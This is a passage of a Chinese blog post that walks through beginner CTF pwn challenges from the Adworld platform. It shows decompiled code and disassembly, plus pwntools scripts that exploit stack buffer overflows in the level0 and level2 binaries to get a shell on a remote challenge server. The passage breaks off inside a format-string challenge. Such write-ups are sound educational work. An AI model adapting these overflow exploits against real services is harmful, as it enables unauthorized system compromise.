<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>攻防世界-新手区 | PlayDumb</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="新手区Tomorrow always comes, and tomorrow always brings write-ups. ALWAYS FOLLOW UP A PROBLEM YOU WORKED ON, BY READING WRITE-UPS. get_shell下载后本地运行即可直接得到 shell ，所以只需要远程连接靶机IP和端口即可。 level 064位文件，checksec发">
<meta property="og:type" content="article">
<meta property="og:title" content="攻防世界-新手区">
<meta property="og:url" content="http://example.com/2022/06/28/adworld-pwn/index.html">
<meta property="og:site_name" content="PlayDumb">
<meta property="og:description" content="新手区Tomorrow always comes, and tomorrow always brings write-ups. ALWAYS FOLLOW UP A PROBLEM YOU WORKED ON, BY READING WRITE-UPS. get_shell下载后本地运行即可直接得到 shell ，所以只需要远程连接靶机IP和端口即可。 level 064位文件，checksec发">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/Users/brian/Desktop/typro/pictures/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A0%88%E5%8F%98%E5%8C%96.png">
<meta property="article:published_time" content="2022-06-27T16:00:00.000Z">
<meta property="article:modified_time" content="2022-08-17T02:24:54.051Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="adword">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/Users/brian/Desktop/typro/pictures/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A0%88%E5%8F%98%E5%8C%96.png">
  
    <link rel="alternate" href="/atom.xml" title="PlayDumb" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 6.2.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">PlayDumb</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-adworld-pwn" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/28/adworld-pwn/" class="article-date">
  <time class="dt-published" datetime="2022-06-27T16:00:00.000Z" itemprop="datePublished">2022-06-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/pwn/">pwn</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      攻防世界-新手区
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="新手区"><a href="#新手区" class="headerlink" title="新手区"></a>新手区</h1><p><strong>Tomorrow always comes, and tomorrow always brings write-ups. ALWAYS FOLLOW UP A PROBLEM YOU WORKED ON, BY READING WRITE-UPS.</strong></p>
<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>下载后本地运行即可直接得到 shell ，所以只需要远程连接靶机IP和端口即可。</p>
<h2 id="level-0"><a href="#level-0" class="headerlink" title="level 0"></a>level 0</h2><p>64位文件，checksec发现没有栈溢出保护。拖进 IDA 里，反编译后的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察到 <code>buf</code> 的大小只有<code>[rsp+0h] [rbp-80h]</code>，与栈底指针有 80h 的偏移，占用内存大小即为 80h ，但是，<code>read</code> 却可以读入 200h 的内容，这里会出现栈溢出。接下来需要我们寻找能利用的溢出后的位置</p>
<p>搜索字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000400200	0000001C	C	/lib64/ld-linux-x86-64.so.2</span><br><span class="line">LOAD:0000000000400311	0000000A	C	libc.so.6</span><br><span class="line">LOAD:000000000040031B	00000005	C	read</span><br><span class="line">LOAD:0000000000400320	00000007	C	system</span><br><span class="line">LOAD:0000000000400327	00000012	C	__libc_start_main</span><br><span class="line">LOAD:0000000000400339	00000006	C	write</span><br><span class="line">LOAD:000000000040033F	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:000000000040034E	0000000C	C	GLIBC_2.2.5</span><br><span class="line">.rodata:0000000000400684	00000008	C	/bin/sh</span><br><span class="line">.rodata:000000000040068C	0000000E	C	Hello, World\n</span><br><span class="line">.eh_frame:0000000000400747	00000006	C	;*3$\&quot;</span><br></pre></td></tr></table></figure>

<p>有现成的 <code>/bin/sh</code> 但是存放在只读的 <code>rodata</code> 区域，没法利用。我们发现了另一个函数 <code>callsystem</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400596                 public callsystem</span><br><span class="line">.text:0000000000400596 callsystem      proc near</span><br><span class="line">.text:0000000000400596 ; __unwind &#123;</span><br><span class="line">.text:0000000000400596                 push    rbp</span><br><span class="line">.text:0000000000400597                 mov     rbp, rsp</span><br><span class="line">.text:000000000040059A                 mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:000000000040059F                 call    _system</span><br><span class="line">.text:00000000004005A4                 pop     rbp</span><br><span class="line">.text:00000000004005A5                 retn</span><br><span class="line">.text:00000000004005A5 ; &#125; // starts at 400596</span><br><span class="line">.text:00000000004005A5 callsystem      endp</span><br></pre></td></tr></table></figure>

<p>这里将 <code>/bin/sh</code> 移动到了 edi 指向的内存，随后进行了系统调用，调用了 <code>/bin/sh</code></p>
<p>反编译后的代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">callsystem</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以在<code>read</code> 向 buf 输入内容时前 80h 我们正常输入，之后的输入我们将输入 <code>callsystem()</code> 所在的位置（注意是返回到函数起始位置，因为要重新建立栈帧），来返回一个 shell。</p>
<p>编写 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;64879&quot;</span>)</span><br><span class="line"></span><br><span class="line">gad = <span class="number">0x400596</span></span><br><span class="line"><span class="built_in">print</span>(p64(gad))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + p64(gad)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行发现失败了。失败原因是我们现在的 payload 并没有真正起到控制返回地址的作用。查看 <code>main()</code> 函数汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C6                 push    rbp</span><br><span class="line">.text:00000000004005C7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004005CA                 sub     rsp, 10h</span><br><span class="line">.text:00000000004005CE                 mov     [rbp+var_4], edi</span><br><span class="line">.text:00000000004005D1                 mov     [rbp+var_10], rsi</span><br><span class="line">.text:00000000004005D5                 mov     edx, 0Dh        ; n</span><br><span class="line">.text:00000000004005DA                 mov     esi, offset aHelloWorld ; &quot;Hello, World\n&quot;</span><br><span class="line">.text:00000000004005DF                 mov     edi, 1          ; fd</span><br><span class="line">.text:00000000004005E4                 call    _write</span><br><span class="line">.text:00000000004005E9                 mov     eax, 0</span><br><span class="line">.text:00000000004005EE                 call    vulnerable_function</span><br><span class="line">.text:00000000004005F3                 leave</span><br><span class="line">.text:00000000004005F4                 retn</span><br><span class="line">.text:00000000004005F4 ; &#125; // starts at 4005C6</span><br><span class="line">.text:00000000004005F4 main            endp</span><br></pre></td></tr></table></figure>

<p>在函数结束之前有一次 <code>leave</code> 操作，作用相当于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>可以看到有一次 <code>pop </code> 操作，弹出了 64 位即8字节的数据，所以我们也要把这8字节加上(通过栈帧的结构我们也可以看出来在vlunerable_function函数被调用后，新栈帧中首先就保存了main函数的ebp指针，成为了当前新栈帧的ebp，为[ebp+0]，而[ebp+4]保存了漏洞函数返回地址，即我们需要控制的地方)，完整payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;63630&quot;</span>)</span><br><span class="line"></span><br><span class="line">gad = <span class="number">0x400596</span></span><br><span class="line"><span class="built_in">print</span>(p64(gad))</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(gad)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>

<p>有栈溢出，但是栈上不可执行，需要找lib函数或者写好的后门。查看字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0804824B	00000007	C	system</span><br><span class="line">LOAD:08048252	00000012	C	__libc_start_main</span><br><span class="line">LOAD:08048264	0000000F	C	__gmon_start__</span><br><span class="line">LOAD:08048273	0000000A	C	GLIBC_2.0</span><br><span class="line">.rodata:08048540	0000000C	C	echo Input:</span><br><span class="line">.rodata:0804854C	00000014	C	echo &#x27;Hello World!&#x27;</span><br><span class="line">.eh_frame:080485CB	00000005	C	;*2$\&quot;</span><br><span class="line">.data:0804A024	00000008	C	/bin/sh</span><br></pre></td></tr></table></figure>

<p>发现<code>0804A024</code> 位置有 <code>/bin/sh</code>可以利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(&quot;echo &#x27;Hello World!&#x27;&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  system(&quot;echo Input:&quot;);</span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个函数中都有<code>system()</code> 函数，同时 <code>read()</code> 在 88h 大小的 <code>buf</code> 中接受 100h 的输入，会造成溢出。我们可以控制溢出点，将其指向 <code>system()</code> 函数处，然后传入 <code>/bin/sh</code> 的地址，来完成执行。这两个 <code>system()</code> 都可以利用。<code>main</code>() 中的<code>call_system</code> 位置在 <code>0804849E</code> 。<code>vlunrable_fun</code>() 中的 <code>call_system</code> 也可以，位置在 <code>0804845C</code> </p>
<p>Payload1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">52231</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span> + p32(<span class="number">0x0804845C</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里注意汇编的最后通过 <code>leave</code> 来消除栈，包含了一次 <code>pop ebp</code> 操作，弹出了32位即4字节内容，所以我们payload也把这4字节加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:0804844B                 push    ebp</span><br><span class="line">.text:0804844C                 mov     ebp, esp</span><br><span class="line">.text:0804844E                 sub     esp, 88h</span><br><span class="line">.text:08048454                 sub     esp, 0Ch</span><br><span class="line">.text:08048457                 push    offset command  ; &quot;echo Input:&quot;</span><br><span class="line">.text:0804845C                 call    _system</span><br><span class="line">.text:08048461                 add     esp, 10h</span><br><span class="line">.text:08048464                 sub     esp, 4</span><br><span class="line">.text:08048467                 push    100h            ; nbytes</span><br><span class="line">.text:0804846C                 lea     eax, [ebp+buf]</span><br><span class="line">.text:08048472                 push    eax             ; buf</span><br><span class="line">.text:08048473                 push    0               ; fd</span><br><span class="line">.text:08048475                 call    _read</span><br><span class="line">.text:0804847A                 add     esp, 10h</span><br><span class="line">.text:0804847D                 nop</span><br><span class="line">.text:0804847E                 leave</span><br><span class="line">.text:0804847F                 retn</span><br></pre></td></tr></table></figure>

<p>32位程序覆盖返回地址后直接传参数即可。</p>
<p>Payload2-攻击<code>plt</code>表：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;111.200.241.244&quot;</span></span><br><span class="line">PORT = <span class="number">52231</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&#x27;-r&#x27;</span>:</span><br><span class="line">    p = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span> + <span class="string">&quot;b&quot;</span>*<span class="number">0x4</span> + p32(<span class="number">0x08048320</span>) +p32(<span class="number">0x1929</span>) + p32(<span class="number">0x0804A024</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在 IDA 左边我们发现了 <code>plt</code> 表中也有 <code>system</code> 调用，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int system(const char *command)</span><br><span class="line">&#123;</span><br><span class="line">  return system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们 </p>
<p>32位程序运行中函数参数直接压入栈中，栈结构为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用函数地址 -&gt; 函数返回地址 -&gt; 参数n .... -&gt; 参数1</span><br></pre></td></tr></table></figure>

<p>需要给一个返回值，我这里随便输的。</p>
<p>可以发现其实第一个payload 中我们利用的 <code>call _system</code>  它还是跳转到了 <code>plt</code> 表中，本质上还是一样的。</p>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>本题通过格式化字符串漏洞泄漏变量偏移，利用此偏移修改目标变量值，从而达到执行 <code>shellcode </code> 的条件。</p>
<p>反编译后的主要代码如下：</p>
<p><strong>main()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v4 = (__int64)v3;  <span class="comment">// in fact,v4==v3</span></span><br><span class="line">  *v3 = <span class="number">68</span>;					 <span class="comment">// *v3 != v3[1] right now</span></span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">85</span>;				 <span class="comment">// v3[1]&#x27;s value we already knew</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we will tell you two secret ...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4, a2); <span class="comment">// print v4&#x27;s location</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">4</span>); <span class="comment">// next to v4 location</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do not tell anyone &quot;</span>);</span><br><span class="line">  sub_400D72(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The End.....Really?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400D72(v4)</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">0xC</span> )                      <span class="comment">// length &lt; 12</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating a new player.&quot;</span>);</span><br><span class="line">    sub_400A7D();		<span class="comment">//east</span></span><br><span class="line">    sub_400BB9();		<span class="comment">//v2 &amp; format</span></span><br><span class="line">    sub_400CA6((_DWORD *)a1); <span class="comment">// passed v4,excuate shell</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hei! What&#x27;s up!&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_400A7D()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?east or up?:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;s1);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) || !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) )<span class="comment">// only east</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hei! I&#x27;m secious!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So, where you will go?:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;east&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;s1, <span class="string">&quot;up&quot;</span>) )</span><br><span class="line">      sub_4009DD();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;YOU KNOW WHAT YOU DO?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><strong>sub_4009DD()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;where you will go?!left(0) or right(1)?!:&quot;</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = rand() % <span class="number">2</span>;</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%d&quot;</span>, (__int64)&amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( v1 != v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You escape it!but another hole appear!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;where you will go?!left(0) or right(1)?!:&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YOU ARE DEAD&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p><strong>sub_400BB9()</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%ld&quot;</span>, (__int64)&amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf((__int64)<span class="string">&quot;%s&quot;</span>, (__int64)&amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, 